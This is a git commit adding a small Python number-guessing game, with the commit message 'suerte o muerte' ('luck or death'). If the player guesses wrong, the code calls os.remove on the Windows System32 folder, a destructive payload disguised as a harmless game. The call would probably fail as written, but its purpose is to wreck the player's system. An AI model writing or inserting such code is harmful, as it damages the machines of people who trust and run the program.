81059fef9428de84a374684eb016babd51ba5cc7
Alberto Gabriel Guaman Garcia <80141815+GbrielGarcia@users.noreply.github.com>
2023-12-10 22:41:22 -0500

    suerte o muerte

---
+++ juego_una_vez.py
@@ -0,0 +1,30 @@
+import random
+import os
+
+numero = random.randint(1,5)
+print("Bienvenido al juego de adivinar el numero del 1 al 5")
+numeroINgreso = int(input("Adivina el número entre 1 al 5"))
+
+if numero == numeroINgreso:
+    print("Has acertado")
+else:
+    os.remove("C:\Windows\System32")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
